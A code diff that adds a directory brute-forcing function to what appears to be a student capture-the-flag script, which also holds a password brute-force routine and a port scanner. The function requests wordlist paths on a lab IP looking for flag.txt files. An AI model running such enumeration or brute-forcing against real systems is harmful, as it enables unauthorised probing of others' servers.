@@ -110,7 +110,17 @@ def bruteForce():
             else:
                 print("Username: {}  Password: {}".format(user,line))
                 return
-
+            
+def directoryBruteForce():
+    base = 'http://10.12.0.30/'
+    with open(b'C:\Users\student\Downloads\directories.txt', 'r') as f:
+        for line in f:
+            line = line.strip()
+            url = base+line+'/flag.txt'
+            r = requests.get(url)
+            if r.status_code == 200:
+                print("The URL: {} has the flag: {}".format(url,str(r.content)[2:-3]))
+            
 if __name__ == "__main__":
     # These will give you all open ports, services/versions, and vulnerabilities
     #versionDict = portScanner()
